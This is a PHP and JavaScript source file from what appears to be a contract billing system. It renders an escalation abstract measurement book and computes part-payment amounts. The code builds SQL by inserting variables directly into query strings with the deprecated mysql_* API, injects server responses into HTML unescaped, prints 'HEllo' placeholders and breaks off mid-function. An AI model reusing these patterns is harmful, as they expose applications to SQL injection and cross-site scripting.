<?php
//session_start();
@ob_start();
require_once 'library/config.php';
require_once 'library/functions.php';
require_once 'library/binddata.php';
checkUser();
include "library/common.php";
include "spellnumber.php";
$msg = ''; $Line = 0;
function dt_display($ddmmyyyy)
{
 $dt=explode('-',$ddmmyyyy);
 $dd=$dt[2];
 $mm=$dt[1];
 $yy=$dt[0];
 return $dd . '/' . $mm . '/' . $yy;
}
function dt_format($ddmmyyyy) {
    $dt = explode('-', $ddmmyyyy);
    $dd = $dt[0];
    $mm = $dt[1];
    $yy = $dt[2];
    return $yy . '-' . $mm . '-' . $dd;
}
function checkPartpayment($DpmArrMbidList,$Key)
{
	$InitKey = $Key;
	while($perc = current($DpmArrMbidList)) 
	{
		if ($perc == $InitKey) 
		{
			$res .= key($DpmArrMbidList)."*";
		}
		next($DpmArrMbidList);
	}
	return rtrim($res,"*");
}

function removeArray($res,$array)
{
	$explodeRes = explode("*",rtrim($res,"*"));
	for($i=0; $i<count($explodeRes);$i++)
	{
		$RemKey = $explodeRes[$i];
		unset($array[$RemKey]);
	}
	return $array;
}
function CheckPageBreak($tablehead,$abstmbno,$table,$page)
{
	$nextpage = $page+1;
	$Output .= "<tr>
					<td colspan='3' align='right' class='labelbold'>C/o Page No ".$nextpage."/ Abstract MB No ".$abstmbno."</td>
					<td></td>
					<td></td>
					<td align='right' class='labelbold'>HEllo</td>
					<td></td>
					<td></td>
					<td align='right' class='labelbold'>HEllo</td>
					<td></td>
					<td align='right' class='labelbold'>HEllo</td>
					<td></td>
				</tr>";
	$Output .=  "<tr class='labelprint'><td colspan='12' align='center' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;'>Page ".$page."</td></tr>";
	$Output .= "</table>";
	$Output .= "<p  style='page-break-after:always;'></p>";
	$Output .= '<table width="1087px" border="0"  cellpadding="2" cellspacing="2" align="center" bgcolor="#FFFFFF" style="border:none;" class="labelprint">
				<tr style="border:none;"><td align="right" style="border:none;">Abstract M.Book No. '.$abstmbno.'&nbsp;&nbsp;</td></tr>
				</table>';
	$Output .= $table;
	$Output .= "<table width='1087px' cellpadding='3' cellspacing='3' align='center' class='label table1' bgcolor='#FFFFFF' id='table1'>";
	$Output .= $tablehead;
	$Output .= "<tr>
					<td colspan='3' align='right' class='labelbold'>B/f from Page No ".$page."/ Abstract MB No ".$abstmbno."</td>
					<td></td>
					<td></td>
					<td align='right' class='labelbold'>HEllo</td>
					<td></td>
					<td></td>
					<td align='right' class='labelbold'>HEllo</td>
					<td></td>
					<td align='right' class='labelbold'>HEllo</td>
					<td></td>
				</tr>";
	echo $Output;
}

function UpdateItemAbstractPageNo($abstsheetid,$abstmbno,$subdivid,$page)
{
	$update_pageno_sql = "update measurementbook_temp set abstmbookno = '$abstmbno', abstmbpage = '$page' where sheetid	= '$abstsheetid' AND subdivid = '$subdivid'";
	//$update_pageno_query = mysql_query($update_pageno_sql);
}

function GetAllEscMonth($fromdate,$todate)
{
	$MonthList 	= array();
	$time   	= strtotime($fromdate);
	$last   	= date('M-Y', strtotime($todate));
	while ($month != $last) 
	{
		$month 	= date('M-Y', $time);
		$total 	= date('t', $time);
		array_push($MonthList,$month);
		$time 	= strtotime('+1 month', $time);
	}
	return $MonthList;
}
function GetAllRbnMonth($fromdate,$todate)
{
	$MonthList 	= array();
	$time   	= strtotime($fromdate);
	$last   	= date('M-Y', strtotime($todate));
	while ($month != $last) 
	{
		$month 	= date('M-Y', $time);
		$total 	= date('t', $time);
		array_push($MonthList,$month);
		$time 	= strtotime('+1 month', $time);
	}
	return $MonthList;
}

function CheckDeviatedQtyItem($sheetid,$subdivid,$used_qty)
{
	$Over_all_Qty = 0; $temp = 0; $OutPut = "";
	$select_devQty_query = "select total_quantity, deviate_qty_percent, decimal_placed from schdule where sheet_id = '$sheetid' and subdiv_id = '$subdivid'";
	$select_devQty_sql = mysql_query($select_devQty_query);
	if($select_devQty_sql == true)
	{
		if(mysql_num_rows($select_devQty_sql)>0)
		{
			$List = mysql_fetch_object($select_devQty_sql);
			$total_quantity 		= $List->total_quantity;
			$deviate_qty_percent 	= $List->deviate_qty_percent;
			$decimal_placed 		= $List->decimal_placed;
			$Over_all_Qty 			= $total_quantity + ($total_quantity*$deviate_qty_percent/100);
			$Over_all_Qty_with_Dev 	= round($Over_all_Qty,$decimal_placed);
			$used_quantity 			= $used_qty;
			if($used_quantity>$Over_all_Qty_with_Dev)
			{
				$used_deviat_qty = $used_quantity-$Over_all_Qty_with_Dev;
				$temp = 1;
			}
			else
			{
				$used_deviat_qty = 0;
				$temp = 0;
			}
			$OutPut = $Over_all_Qty_with_Dev."*".$used_deviat_qty."*".$temp;
		}
	}
	return $OutPut;
}

$staffid 			= 	$_SESSION['sid'];
$userid 			= 	$_SESSION['userid'];
$abstsheetid    	= 	$_SESSION["escal_sheetid"];   
$abstmbno 			= 	$_SESSION["escal_mbook_no"];  
$abstmbpage  		= 	$_SESSION["escal_mbook_pageno"];	
$fromdate       	= 	$_SESSION['escal_tcc_from_date'];      
$todate   			= 	$_SESSION['escal_tcc_to_date'];    
$abs_mbno_id 		= 	$_SESSION["abs_mbno_id"];

$esc_abs_rbn 		= $_SESSION['esc_rbn'];
$quarter 			= $_SESSION['esc_quarter'];
$esc_id 			= $_SESSION['esc_id'];

$runn_acc_bill_no 	= 	$rbn;
$start_page = $abstmbpage;
//$abstsheetid = 2;
$query 		= 	"SELECT sheet_id, sheet_name, work_order_no, work_name, short_name, tech_sanction, computer_code_no, name_contractor, agree_no, rbn, rebate_percent FROM sheet WHERE sheet_id ='$abstsheetid' ";
$sqlquery 	= 	mysql_query($query);
if ($sqlquery == true) 
{
    $List 					= 	mysql_fetch_object($sqlquery);
    $work_name 				= 	$List->work_name; 
	$short_name 			= 	$List->short_name;   
	$tech_sanction 			= 	$List->tech_sanction;  
    $name_contractor 		= 	$List->name_contractor; 
	$ccno 					= 	$List->computer_code_no;    
	$agree_no 				= 	$List->agree_no; 
	$overall_rebate_perc 	= 	$List->rebate_percent; 
	$runn_acc_bill_no 		= 	$rbn;
	$work_order_no 			= 	$List->work_order_no; /*   if($List->rbn == 0){$runn_acc_bill_no =1;  } else { $runn_acc_bill_no=$List->rbn +1;}*/
	$length1 				= 	strlen($work_name);
 	$start_line1 			= 	ceil($length1/70); 
	$length2 				= 	strlen($agree_no);
	$start_line2 			= 	ceil($length2/27);  
	$LineIncr 				= 	$start_line1 + $start_line2 + 2 + 2; 
}
$Line = $Line + $LineIncr; 


function CheckDeviatedQty($sheetid,$subdivid,$rbn)
{
	$total_used_qty = 0;
	$total_wo_qty = 0;
	$select_used_qty_query = "select SUM(mbtotal) as total_qty from measurementbook where sheetid = '$sheetid' and subdivid = '$subdivid' and rbn < '$rbn'";
	$select_used_qty_sql = mysql_query($select_used_qty_query);
	if($select_used_qty_sql == true)
	{
		if(mysql_num_rows($select_used_qty_sql)>0)
		{
			$List = mysql_fetch_object($select_used_qty_sql);
			
			$total_used_qty = $List->total_qty;
		}
	}
	
	$select_wo_qty_query = "select * from schdule where sheet_id = '$sheetid' and subdiv_id = '$subdivid'";
	$select_wo_qty_sql = mysql_query($select_wo_qty_query);
	if($select_wo_qty_sql == true)
	{
		$SList = mysql_fetch_object($select_wo_qty_sql);
		$decimal 				= $SList->decimal_placed;
		$wo_quantity 			= $SList->total_quantity;
		$deviate_qty_percent 	= $SList->deviate_qty_percent;
		$total_wo_qty  			= $wo_quantity + ($wo_quantity*$deviate_qty_percent/100);
		$total_wo_qty  = round($total_wo_qty,$decimal);
	}
	if($total_used_qty>$total_wo_qty)
	{
		$temp = 1;  // if deviated........
	}
	else
	{
		$temp = 0;
	}
	$res = $total_wo_qty."*".$temp;
	return $res;
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
    <title>Abstrack MBook</title>
    <link rel="stylesheet" href="script/font.css" />
</head>
	<script language="javascript" type="text/javascript" src="script/Date_Calendar.js"></script>
	<script language="javascript" type="text/javascript" src="script/validfn.js"></script>
	<link rel="stylesheet" href="css/button_style.css"></link>
	<link rel="stylesheet" href="js/jquery-ui.css">
	<script src="js/jquery-1.10.2.js"></script>
	<script src="js/jquery-ui.js"></script>
	<link rel="stylesheet" href="/resources/demos/style.css">
	<link rel="stylesheet" href="Font style/font.css" />
	<link type='text/css' href='css/basic.css' rel='stylesheet' media='screen' />
	<script type='text/javascript' src='js/basic_model_jquery.js'></script>
	<script type='text/javascript' src='js/jquery.simplemodal.js'></script>
	<link rel="stylesheet" href="css/font-awesome.css" />
	<!--<script type='text/javascript' src='js/basic.js'></script>-->
	<script src="dist/sweetalert-dev.js"></script>
	<link rel="stylesheet" href="dist/sweetalert.css">
<script type="text/javascript" language="javascript">
	function printBook()
	{
		window.print();
	}
	function goBack()
	{
		url = "EscalationAbstractGenerate.php";
		window.location.replace(url);
	}
	function ValidatePercent(obj,section,idcount)
	{
		//alert(idcount);
		var value = obj.value;
		if(Number(value)>100)
		{
			swal("", "Entered % should be less than 100..!", "error"); 
			obj.value = "";
			document.getElementById("hid_slm_result"+idcount).value = "";
			totalAmountCalculation("slm");
			return false;
		}
		if(section == "dpm")
		{
			var paid_percent_dpm = document.getElementById("txt_partpay_percent_dpm"+idcount).value;
			var remain_percent_dpm = 100-Number(paid_percent_dpm);
			if(value > remain_percent_dpm)
			{
				swal("Entered Percentage should be less than: ", remain_percent_dpm+" %", "error");
				obj.value = "";
				document.getElementById("txt_amt_dpm_payable"+idcount).value = "";
				document.getElementById("hid_dpm_result"+idcount).value = "";
				totalAmountCalculation("dpm");
				return false;
			}
		}
	}
	function ValidateSlm()
	{
		var slmqty = document.getElementById("hid_slm_qty").value;
		var qty = 0;
		$('input[name="txt_partpay_qty_slm[]"]').each(function() {
			var currentqty = $(this).val();
			qty = (Number(qty)+Number(currentqty));
			if(qty>slmqty)
			{
				swal("", "Quantity Not Allowed..:)", "error"); 
				//$(this).val() = "";
				return false;
			}
		});
	}
	function setRowSpan() 
	{
		var i;
		var rowcount =  document.getElementById("table_group_count").value;
		for(i=0; i<rowcount; i++)
		{
			var row_span = document.getElementById("row_count"+i).value;
			document.getElementById("td_popupbutton"+i).rowSpan = row_span;
			var ht = document.getElementById("td_popupbutton"+i);
			 var checkbox_height = ht.offsetHeight;
			 //document.getElementById('ch_item'+i).offsetHeight = checkbox_height;
			 document.getElementById("ch_item"+i).style.height = checkbox_height+"px";
			 //document.getElementById("ch_item"+i).style.width = checkbox_height+"px";
			
		}
	}
	//var index = 1;
	function addRow()
	{
		var x = Number(document.getElementById("table4").rows.length);
		 	 index = x;
		//var arg = "X"+"*"+index;
		var rate = document.getElementById("txt_item_rate_slm0").value;
		var table=document.getElementById("table4");
        var row=table.insertRow(table.rows.length-2);
        	row.id = "rowid"+index;
			row.style.align = "center";
			
		var cell1=row.insertCell(0);
			cell1.setAttribute('class', "dynamicrowcell");
			cell1.style.padding = "0px 0px 0px 0px";
				
		var txt_box1 = document.createElement("input");
			txt_box1.name = "txt_partpay_qty_slm[]";
            txt_box1.id = "txt_partpay_qty_slm"+index;
			//txt_box1.value = row.id;
			txt_box1.style.width = 93+"px";
			txt_box1.style.border = "1px solid #2aade4";
			txt_box1.style.textAlign = "right";
			txt_box1.setAttribute('class', "dynamictextbox"); 
            cell1.appendChild(txt_box1);
			/*txt_box1.onblur= function () {
								ValidateSlm();
                        	  calculateAmount(this,index,"qty","slm")
                    		}*/
							txt_box1.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"qty","slm")
												ValidateSlm();
												};
											})(index); 
		var cell2=row.insertCell(1);
			cell2.setAttribute('class', "dynamicrowcell");	
			cell2.style.padding = "0px 0px 0px 0px";
		var txt_box2 = document.createElement("input");
			txt_box2.name = "txt_item_rate_slm";
            txt_box2.id = "txt_item_rate_slm"+index;
			txt_box2.value = Number(rate).toFixed(2);
			txt_box2.style.textAlign = "right";
			txt_box2.style.width = 80+"px";
			txt_box2.readOnly = true;
			txt_box2.setAttribute('class', "dynamictextbox"); 
            cell2.appendChild(txt_box2);
			/*txt_box2.onblur= function () {
                        	  calculateAmount(this,index,"rate","slm")
                    		}*/
							txt_box2.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"rate","slm")
												ValidateSlm();
												};
											})(index); 
		var cell3=row.insertCell(2);
			cell3.setAttribute('class', "dynamicrowcell");	
			cell3.style.padding = "0px 0px 0px 0px";
		var txt_box3 = document.createElement("input");
			txt_box3.name = "txt_partpay_percent_slm";
            txt_box3.id = "txt_partpay_percent_slm"+index;
			//txt_box3.value = txt_box3.id;
			txt_box3.style.width = 40+"px";
			txt_box3.style.textAlign = "right";
			txt_box3.style.border = "1px solid #2aade4";
			txt_box3.setAttribute('class', "dynamictextbox"); 
			/*txt_box3.onblur= function () {
                        	  calculateAmount(this,index,"percent","slm");
							  ValidatePercent(this)
                    		}*/
							txt_box3.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"percent","slm")
												ValidatePercent(this,"slm",ind);
												};
											})(index);
            cell3.appendChild(txt_box3);
							
		var cell4=row.insertCell(3);
			cell4.setAttribute('class', "dynamicrowcell");	
			cell4.style.padding = "0px 0px 0px 0px";
		var txt_box4 = document.createElement("input");
			txt_box4.name = "txt_partpay_amt_slm[]";
            txt_box4.id = "txt_partpay_amt_slm"+index;
			txt_box4.style.width = 130+"px";
			txt_box4.style.textAlign = "right";
			txt_box4.style.pointerEvents = "none";
			txt_box4.setAttribute('class', "dynamictextbox"); 
            cell4.appendChild(txt_box4);
		
		var cell5=row.insertCell(4);
			//cell5.style.width = 10+"px";
			cell5.style.textAlign = "center";
			cell5.style.padding = "0px 0px 0px 0px";
        var delbtn=document.createElement("input");
        	delbtn.type = "button";
        	delbtn.value = " X ";
        	delbtn.id = "btn_delete"+index;
			delbtn.name = "btn_delete";
			delbtn.setAttribute('class', "delbtnstyle");
			delbtn.style.width = 32+"px";
			delbtn.style.borderRadius = 0+"px";
        	delbtn.onclick = function () {
                        	  deleteRow(this);
                    		}
        	cell5.appendChild(delbtn);
			
			//var cell6=row.insertCell(5);
			//cell5.style.width = 10+"px";
			//cell6.style.textAlign = "center";
			//cell6.style.padding = "0px 0px 0px 0px";
			//cell6style.visibility = "hidden";	
			
	// BELOW FIELD IS HIDDEN BOX FIELD....SO APPEND IN ADD & DELETE BUTTON FIELD ITSELF..No seperate TD(cell) creation for this. check above ( index++ : line)
		var txt_box5 = document.createElement("input");
        	txt_box5.type = "hidden";
        	txt_box5.id = "hid_slm_result"+index;
			txt_box5.name = "hid_slm_result[]";
			txt_box5.setAttribute('class', "dynamictextbox");
			txt_box5.style.width = 70+"px";
			txt_box5.style.borderRadius = 0+"px";
			cell5.appendChild(txt_box5);
			index++;
	}
	function deleteRow(obj) 
	{
	   //var row = document.getElementById(id);
	   //row.parentNode.removeChild(row);
	   /*$('input[name = "btn_delete"]').click(function(){
		   $(this).closest('tr').remove()
		})*/
		var tr = $(obj).closest('tr');
		tr.remove();
	   totalAmountCalculation("slm");
	   return true;
	}
	function calculateAmount(obj,id,type,section)
	{
		var idcount = id;
		var currentvalue = obj.value;
		var itemid = document.getElementById("txt_item_id").value;
		var currentrbn = document.getElementById("txt_rab_no").value;
		if(section == "slm")
		{
			if(type == "qty")
			{
				var rate = document.getElementById("txt_item_rate_slm"+idcount).value;
				var percent = document.getElementById("txt_partpay_percent_slm"+idcount).value;
				var qty = currentvalue;
				//alert(percent)
			}
			if(type == "rate")
			{
				var qty = document.getElementById("txt_partpay_qty_slm"+idcount).value;
				var percent = document.getElementById("txt_partpay_percent_slm"+idcount).value;
				var rate = currentvalue;
			}
			if(type == "percent")
			{
				var rate = document.getElementById("txt_item_rate_slm"+idcount).value;
				var qty = document.getElementById("txt_partpay_qty_slm"+idcount).value;
				var percent = currentvalue;
			}
			qty = Number(qty);
			//alert(qty)
			rate = Number(rate);
			//alert(rate)
			percent = Number(percent);
			//alert(percent)
			if((qty != "") && (rate != "") && (percent != ""))
			{
				var amount = qty * rate * percent / 100;
				document.getElementById("txt_partpay_amt_slm"+idcount).value = Number(amount).toFixed(2);
				var result = percent + "*" + currentrbn + "*" + qty + "*" + itemid;
				document.getElementById("hid_slm_result"+idcount).value = result;
			}
			else
			{
				document.getElementById("txt_partpay_amt_slm"+idcount).value = "";
				document.getElementById("hid_slm_result"+idcount).value = "";
			}
		}
		if(section == "dpm")
		{
			var rate_dpm 	= document.getElementById("txt_item_rate_dpm"+idcount).value;
			var qty_dpm 	= document.getElementById("txt_partpay_qty_dpm"+idcount).value;
			var rbn_dpm 	= document.getElementById("txt_rbn_dpm"+idcount).value;
			var mbid_dpm 	= document.getElementById("hid_dpm_mbid"+idcount).value;
			var percent_dpm = currentvalue;
				qty_dpm 	= Number(qty_dpm);
				rate_dpm 	= Number(rate_dpm);
				percent_dpm = Number(percent_dpm);
			if((qty_dpm != "") && (rate_dpm != "") && (percent_dpm != ""))
			{
				var amount_dpm = qty_dpm * rate_dpm * percent_dpm / 100;
				document.getElementById("txt_amt_dpm_payable"+idcount).value = Number(amount_dpm).toFixed(2);
				var result = percent_dpm + "*" + currentrbn + "*" + qty_dpm + "*" + itemid + "*" + rbn_dpm + "*" + mbid_dpm;
				//alert(result)
				document.getElementById("hid_dpm_result"+idcount).value = result;
			}
			else
			{
				document.getElementById("txt_amt_dpm_payable"+idcount).value = "";
				document.getElementById("hid_dpm_result"+idcount).value = "";
			}
		}
		totalAmountCalculation(section);
		
		return true;
	}
	
	function totalAmountCalculation(section)
	{
		var amount = 0;
		if(section == "slm")
		{
			$('input[name="txt_partpay_amt_slm[]"]').each(function() {
				var amt = $(this).val();
				amount = (Number(amount)+Number(amt));
			});
			
			var DpmPayableAmount = document.getElementById("txt_partpay_total_payableamt_dpm").value;
			//if(DpmPayableAmount == ""){ DpmPayableAmount = 0; }
			var OverAllAmount = Number(amount)+Number(DpmPayableAmount);
			
			if(amount>0)
			{
				document.getElementById("txt_partpay_total_amt_slm").value = Number(amount).toFixed(2);
			}
			else
			{
				document.getElementById("txt_partpay_total_amt_slm").value = "";
			}
			document.getElementById("txt_overall_total").value = Number(OverAllAmount).toFixed(2);
		}
		if(section == "dpm")
		{
			$('input[name="txt_amt_dpm_payable[]"]').each(function() {
				var amt = $(this).val();
				amount = (Number(amount)+Number(amt));
			});
			
			var SlmTotalAmount = document.getElementById("txt_partpay_total_amt_slm").value;
			//if(SlmTotalAmount == ""){ SlmTotalAmount = 0; }
			var OverAllAmount = Number(amount)+Number(SlmTotalAmount);
			
			if(amount>0)
			{
				document.getElementById("txt_partpay_total_payableamt_dpm").value = Number(amount).toFixed(2);
			}
			else
			{
				document.getElementById("txt_partpay_total_payableamt_dpm").value = "";
			}
			document.getElementById("txt_overall_total").value = Number(OverAllAmount).toFixed(2);
		}
	}
	
	function getDPMdetaiils(sheetid,itemid,rate)
	{
		var xmlHttp;
		var data;
		var i, rbn, qty, percent, measurementbookid, searchflag, RemarkData ="", newrow = "",TotalPaidDpmAmount = 0,TotalPayableDpmAmount = 0; 
		var currentrbn = document.getElementById("txt_rab_no").value;
		var rate = Number(rate);	
		if(window.XMLHttpRequest) // For Mozilla, Safari, ...
		{
			xmlHttp = new XMLHttpRequest();
		}
		else if(window.ActiveXObject) // For Internet Explorer
		{ 
			xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
		}
		strURL="find_dpm_details.php?sheetid="+sheetid+"&itemid="+itemid;
		xmlHttp.open('POST', strURL, true);
		xmlHttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
		xmlHttp.onreadystatechange = function()
		{
			if (xmlHttp.readyState == 4)
			{
				data=xmlHttp.responseText;
				if(data != "")
				{
					var details = data.split("*");
					var index = 1;
					for(i=0; i<details.length; i+=6)
					{
						RemarkData = ""; 
						rbn 				= details[i];
						qty 				= details[i+1];
						percent 			= details[i+2];
						measurementbookid 	= details[i+3];
						searchflag 			= details[i+4];
						PayableDpmSlmPercent 		= details[i+5];
						if((PayableDpmSlmPercent != "") && (PayableDpmSlmPercent != "X"))
						{
							var PayableSlmDpmAmt = Number(qty)*Number(PayableDpmSlmPercent)*Number(rate)/100;
								TotalPayableDpmAmount = (Number(TotalPayableDpmAmount)+Number(PayableSlmDpmAmt));
							var result = PayableDpmSlmPercent + "*" + currentrbn + "*" + qty + "*" + itemid + "*" + rbn + "*" + measurementbookid;
						}
						else
						{
							var PayableSlmDpmAmt = 0;
							var result = "";
						}
						//alert(searchflag)
						
						
						if((searchflag != "") && (searchflag != "X"))
						{
							var searchflagdetails = searchflag.split("@");
							
								RemarkData  = "<table style='color:blue;font-family:verdana;font-size:13px;' class='table1' align='center' width='80%' bgcolor=''>";
								RemarkData += "<tr height='30px' style='color:white;font-family:verdana;font-size:13px;background-color:#078c9b;'><td colspan = '3'>Quantity : "+qty+"</td></tr>";
								RemarkData += "<tr height='27px' style='color:white;font-family:verdana;font-size:13px;background-color:#a5b23c;'><td>RBN No.</td><td>Date</td><td>Paid Percent ( % )</td></tr>";
								for(j=0; j<searchflagdetails.length; j+=3)
								{
									remarkPercent 	= searchflagdetails[j+0];
									remarkRbn 		= searchflagdetails[j+1];
									remarkDate 		= searchflagdetails[j+2];
									
									if((remarkPercent != "") && (remarkPercent != "X"))
									{
										//alert(remarkPercent)
										//alert(remarkRbn)
										RemarkData += "<tr id='trid"+j+"'><td>"+remarkRbn+"</td><td>"+remarkDate+"</td><td>"+remarkPercent+"</td></tr>";
									}
								}
								RemarkData += "</table>";
						}
						//var rate = document.getElementById("txt_item_rate_slm0").value;
						var amount = Number(qty)*Number(percent)*Number(rate)/100;
						 	TotalPaidDpmAmount = (Number(TotalPaidDpmAmount)+Number(amount));
						var table = document.getElementById("table3");
						var row = table.insertRow(table.rows.length-2);
							row.id = "rowid_dpm"+index;
							row.style.align = "center";
							
						var cell1=row.insertCell(0);
							cell1.setAttribute('class', "");
							cell1.style.textAlign = "center";	
							cell1.style.padding = "0px 0px 0px 0px";
						if(searchflag == "X")
						{	
							var txt_box1 = document.createElement("input");
							txt_box1.name = "txt_rbn_dpm";
							txt_box1.id = "txt_rbn_dpm"+index;
							txt_box1.value = rbn;
							txt_box1.style.width = 37+"px";
							txt_box1.style.textAlign = "center";
							txt_box1.style.pointerEvents = "none";
							txt_box1.setAttribute('class', "dynamictextbox"); 
							cell1.appendChild(txt_box1);
						}
						else
						{
							var txt_box1 = document.createElement("input");
							txt_box1.type = "hidden";
							txt_box1.name = "txt_rbn_dpm";
							txt_box1.id = "txt_rbn_dpm"+index;
							txt_box1.value = rbn;
							txt_box1.style.width = 37+"px";
							txt_box1.style.textAlign = "center";
							txt_box1.style.pointerEvents = "none";
							txt_box1.setAttribute('class', "dynamictextbox"); 
							cell1.appendChild(txt_box1);
							
							var srch_btn1 = document.createElement("input");
							srch_btn1.type = "image";
							srch_btn1.name = "srch_btn_dpm";
							srch_btn1.style.textAlign = "center";
							srch_btn1.id = "srch_btn_dpm"+index;
							srch_btn1.src = "images/search (10).png";
							srch_btn1.style.width = 25+"px";
							srch_btn1.style.height = 20+"px";
							
							var txt_remarkdata_dpm_1 = document.createElement("input");
								txt_remarkdata_dpm_1.type = "hidden";
								txt_remarkdata_dpm_1.id = "hid_dpm_remarkdata"+index;
								txt_remarkdata_dpm_1.name = "hid_dpm_remarkdata[]";
								txt_remarkdata_dpm_1.value = RemarkData;
								txt_remarkdata_dpm_1.setAttribute('class', "dynamictextbox");
								txt_remarkdata_dpm_1.style.width = 70+"px";
								txt_remarkdata_dpm_1.style.borderRadius = 0+"px";
								cell1.appendChild(txt_remarkdata_dpm_1);
							
							//srch_btn1.style.textAlign = "center";
							//srch_btn1.style.pointerEvents = "none";
							//srch_btn1.setAttribute('class', "dynamictextbox"); 
							/*txt_box6.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"percent","dpm");
												ValidatePercent(this,"dpm",ind);
												};
											})(index);*/
							cell1.appendChild(srch_btn1);
							srch_btn1.onclick = (function (ind) {
												return function() {
												  ShowRemarks(ind)
												  };
												})(index);
							/*srch_btn1.onclick = function () {
												  ShowRemarks(RemarkData)
												}*/
						}
								
							
						var cell2=row.insertCell(1);
							cell2.setAttribute('class', "dynamicrowcell");	
							cell2.style.padding = "0px 0px 0px 0px";
						var txt_box2 = document.createElement("input");
							txt_box2.name = "txt_partpay_qty_dpm";
							txt_box2.id = "txt_partpay_qty_dpm"+index;
							txt_box2.value = Number(qty).toFixed(3);
							txt_box2.style.width = 90+"px";
							txt_box2.style.textAlign = "right";
							txt_box2.style.pointerEvents = "none";
							txt_box2.setAttribute('class', "dynamictextbox"); 
							cell2.appendChild(txt_box2);
							
						var cell3=row.insertCell(2);
							cell3.setAttribute('class', "dynamicrowcell");	
							cell3.style.padding = "0px 0px 0px 0px";
						var txt_box3 = document.createElement("input");
							txt_box3.name = "txt_item_rate_dpm";
							txt_box3.id = "txt_item_rate_dpm"+index;
							txt_box3.value = Number(rate).toFixed(2);
							txt_box3.style.width = 80+"px";
							txt_box3.style.textAlign = "right";
							txt_box3.style.pointerEvents = "none";
							txt_box3.setAttribute('class', "dynamictextbox"); 
							cell3.appendChild(txt_box3);
							
						var cell4=row.insertCell(3);
							cell4.setAttribute('class', "dynamicrowcell");	
							cell4.style.padding = "0px 0px 0px 0px";
						var txt_box4 = document.createElement("input");
							txt_box4.name = "txt_partpay_percent_dpm";
							txt_box4.id = "txt_partpay_percent_dpm"+index;
							txt_box4.value = Number(percent);
							txt_box4.style.width = 35+"px";
							txt_box4.style.textAlign = "right";
							txt_box4.style.pointerEvents = "none";
							txt_box4.setAttribute('class', "dynamictextbox"); 
							cell4.appendChild(txt_box4);
						
						var cell5=row.insertCell(4);
							cell5.setAttribute('class', "dynamicrowcell");	
							cell5.style.padding = "0px 0px 0px 0px";
						var txt_box5 = document.createElement("input");
							txt_box5.name = "txt_partpay_amt_dpm";
							txt_box5.id = "txt_partpay_amt_dpm"+index;
							txt_box5.value = Number(amount).toFixed(2);
							txt_box5.style.width = 110+"px";
							txt_box5.style.textAlign = "right";
							txt_box5.style.pointerEvents = "none";
							txt_box5.setAttribute('class', "dynamictextbox"); 
							cell5.appendChild(txt_box5);
							
						var cell6=row.insertCell(5);
							cell6.setAttribute('class', "dynamicrowcell");	
							cell6.style.padding = "0px 0px 0px 0px";
						if(percent < 100)
						{
							var txt_box6 = document.createElement("input");
								txt_box6.name = "txt_percent_dpm_payable";
								txt_box6.id = "txt_percent_dpm_payable"+index;
								txt_box6.value = Number(PayableDpmSlmPercent);
								txt_box6.style.width = 35+"px";
								txt_box6.style.border = "1px solid #2aade4";
								txt_box6.style.backgroundColor = "#ffffff";
								txt_box6.style.textAlign = "right";
								txt_box6.setAttribute('class', "dynamictextbox");
								txt_box6.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"percent","dpm");
												ValidatePercent(this,"dpm",ind);
												};
											})(index); 
								cell6.appendChild(txt_box6);
						}
						else
						{
							cell6.innerHTML = "";
						}
							
						var cell7=row.insertCell(6);
							cell7.setAttribute('class', "dynamicrowcell");	
							cell7.style.padding = "0px 0px 0px 0px";
						if(percent < 100)
						{
							var txt_box7 = document.createElement("input");
								txt_box7.name = "txt_amt_dpm_payable[]";
								txt_box7.id = "txt_amt_dpm_payable"+index;
								txt_box7.value = Number(PayableSlmDpmAmt).toFixed(2);
								txt_box7.style.width = 110+"px";
								txt_box7.style.textAlign = "right";
								txt_box7.style.pointerEvents = "none";
								txt_box7.setAttribute('class', "dynamictextbox"); 
								cell7.appendChild(txt_box7);
						}
						else
						{
							cell7.innerHTML = "";
						}
						
						var txt_box8 = document.createElement("input");
							txt_box8.type = "hidden";
							txt_box8.id = "hid_dpm_result"+index;
							txt_box8.name = "hid_dpm_result[]";
							txt_box8.value = result;
							txt_box8.setAttribute('class', "dynamictextbox");
							txt_box8.style.width = 70+"px";
							txt_box8.style.borderRadius = 0+"px";
							cell7.appendChild(txt_box8);
							
						var txt_box9 = document.createElement("input");
							txt_box9.type = "hidden";
							txt_box9.id = "hid_dpm_mbid"+index;
							txt_box9.name = "hid_dpm_mbid";
							txt_box9.value = measurementbookid;
							txt_box9.setAttribute('class', "dynamictextbox");
							txt_box9.style.width = 70+"px";
							txt_box9.style.borderRadius = 0+"px";
							cell7.appendChild(txt_box9);
						index++;	
					}
					document.getElementById("txt_partpay_total_paidamt_dpm").value = Number(TotalPaidDpmAmount).toFixed(2);
					document.getElementById("txt_partpay_total_payableamt_dpm").value = Number(TotalPayableDpmAmount).toFixed(2);
				}
				
			}
		}
		xmlHttp.send(strURL);	
	}
	
	function getSLMdetaiils(sheetid,itemid,rate)
	{
		var xmlHttp; 
		var data;
		var i, rbn, qty, percent, newrow = "", amt;
		var slmitemQty = document.getElementById("hid_slm_qty").value;
		if(Number(slmitemQty) == 0)
		{
			document.getElementById("rowid0").className = "hide";
		}
		else
		{
			document.getElementById("rowid0").className = "";
		}
		var rate = Number(rate);	
		if(window.XMLHttpRequest) // For Mozilla, Safari, ...
		{
			xmlHttp = new XMLHttpRequest();
		}
		else if(window.ActiveXObject) // For Internet Explorer
		{ 
			xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
		}
		strURL="find_slm_details.php?sheetid="+sheetid+"&itemid="+itemid;
		xmlHttp.open('POST', strURL, true);
		xmlHttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
		xmlHttp.onreadystatechange = function()
		{
			if (xmlHttp.readyState == 4)
			{
				data=xmlHttp.responseText; 
				if(data != "")
				{
					
